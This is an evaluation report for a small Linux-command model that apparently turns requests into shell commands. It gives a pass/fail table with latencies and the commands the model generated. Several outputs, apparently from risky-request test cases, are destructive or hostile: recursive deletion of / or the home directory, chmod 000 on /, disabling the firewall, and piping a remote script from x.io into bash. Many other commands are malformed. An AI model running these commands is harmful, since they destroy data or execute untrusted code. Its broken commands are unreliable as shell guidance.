# eval: llama-server / lfm2-700m-linux-command.Q4_K_M.gguf (lfm2-700m-linuxcmd)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 39/72 (54%)
- cold p50 119ms p95 186ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 108 | - | node -v npm -v |
| u02 | ✓ | 145 | - | find . -size -x1M -exec ls -l {} \; |
| u03 | ✗ | 84 | - | hostname -I |
| u04 | ✗ | 119 | - | sudo lsof -i :3000 |
| u05 | ✓ | 85 | - | du -sh * |
| u06 | ✗ | 135 | - | find /var/log/*.log -mtime -1 |
| u07 | ✗ | 104 | - | sudo ps aux | grep node |
| u08 | ✓ | 76 | - | git status |
| u09 | ✓ | 103 | - | sudo apt install ripgrep |
| u10 | ✓ | 99 | - | mkdir -p projects |
| u11 | ✗ | 119 | - | gzip -r archive.tar.gz |
| u12 | ✓ | 94 | - | env | grep PATH |
| u13 | ✗ | 111 | - | kill -9 -p 8080 |
| u14 | ✓ | 134 | - | tail -n 20 /var/log/syslog |
| u15 | ✗ | 135 | - | sudo dpkg -i --check python3 |
| u16 | ✗ | 186 | - | sudo apt update && sudo apt list --find-outside --name '*outdated' |
| u17 | ✗ | 134 | - | echo "$(whoami) is in $(pwd)" |
| u18 | ✗ | 111 | - | git rm --preserve- Changes |
| u19 | ✗ | 126 | - | ls -s ~/ | head -n 5 |
| u20 | ✓ | 82 | - | free -u |
| u21 | ✓ | 157 | - | find . -name "*.js" -exec wc -l {} \; |
| u22 | ✓ | 111 | - | sudo systemctl restart docker |
| u23 | ✓ | 125 | - | chmod +x script.sh && .script.sh |
| u24 | ✓ | 147 | - | grep -E '.* TODO.*' /src/*.sh |
| u25 | ✗ | 231 | - | curl -L https://example.com/file.zip | xargs -I {} sudo tee ~/downloads/{} |
| u26 | ✗ | 102 | - | top -u | grep core |
| u27 | ✗ | 146 | - | sudo nano /etc/zshrc export FOO=bar |
| u28 | ✓ | 152 | - | find . -name node_modules -exec rm -rf {} \; |
| u29 | ✗ | 82 | - | ss -l |
| u30 | ✗ | 104 | - | zip -d file.zip . |
| u31 | ✗ | 141 | - | watch -f /var/log/syslog | grep ERROR |
| u32 | ✗ | 124 | - | watch -n 1 systemctl --state start |
| u33 | ✗ | 150 | - | find /etc/shells -type f -name "*.sh" |
| u34 | ✗ | 93 | - | sudo dig -x |
| u35 | ✓ | 93 | - | cp file.txt backup.txt |
| u36 | ✓ | 97 | - | mv old.txt new.txt |
| u37 | ✓ | 101 | - | du -sh ~/downloads |
| u38 | ✗ | 132 | - | sudo apt list --installed --global npm packages |
| u39 | ✗ | 173 | - | find . -print0 | xargs -0 -I '{}' find . -print |
| u40 | ✗ | 156 | - | sudo dpkg -r --dry-run flush_dns_cache |
| a01 | ✗ | 89 | - | find ~ -delete |
| a02 | ✗ | 135 | - | sudo apt remove --purge --reinstall ubuntu |
| a03 | ✓ | 105 | - | git push -f mychanges main |
| a04 | ✓ | 122 | - | sudo zsh install sketchy/install.sh |
| a05 | ✗ | 110 | - | killall -u $(whoami) |
| a06 | ✗ | 116 | - | sudo chmod 777 -R root/* |
| a07 | ✓ | 164 | - | sudo bash -c 'while true; do sleep 1; done' |
| a08 | ✓ | 180 | - | sudo zsh -e 'sudo dpkg -i https://x.io/i' |
| a09 | ✓ | 112 | - | sudo chmod -R 000 / |
| a10 | ✓ | 160 | - | find /var/log -mtime +30 -exec rm {} \; |
| a11 | ✗ | 145 | - | sudo nano /etc/rsyslog.d/50-default.conf |
| a12 | ✓ | 100 | - | git reset --hard --all |
| a13 | ✓ | 111 | - | sudo dpkg -r node |
| a14 | ✓ | 100 | - | sudo ufw disable |
| a15 | ✓ | 167 | - | find /tmp -type f -name "*.tmp" -exec rm {} \; |
| a16 | ✓ | 139 | - | find / -type f -exec rm -f {} \; |
| a17 | ✗ | 87 | - | rm -rf ~ |
| a18 | ✓ | 197 | - | sudo -i /bin/zsh -e "echo -n hunter2 | md5sum" myfiles |
| a19 | ✓ | 115 | - | sudo nano /etc/zshrc |
| a20 | ✓ | 151 | - | sudo -i rm -rf / --no-preserve-root |
| u41 | ✓ | 106 | - | find ~ -size +100M |
| u42 | ✗ | 114 | - | echo hello world | tee my notes.txt |
| u43 | ✓ | 98 | - | git log -n 5 |
| u44 | ✓ | 170 | - | curl -s https://example.com | tee -a /tmp/example.html |
| u45 | ✗ | 123 | - | find . -exec wc -l {} \; |
| u46 | ✗ | 90 | - | ifconfig -a |
| u47 | ✓ | 81 | - | df -h |
| u48 | ✓ | 90 | - | who | grep zsh |
| a21 | ✓ | 207 | - | sudo echo "0 1 * * * /usr/local/bin/cleanup.sh" | crontab - |
| a22 | ✓ | 167 | - | sudo ln -s /home/user/etc/hosts /etc/hosts |
| a23 | ✓ | 90 | - | rm -f * |
| a24 | ✗ | 134 | - | curl https://x.io/i.sh | bash |
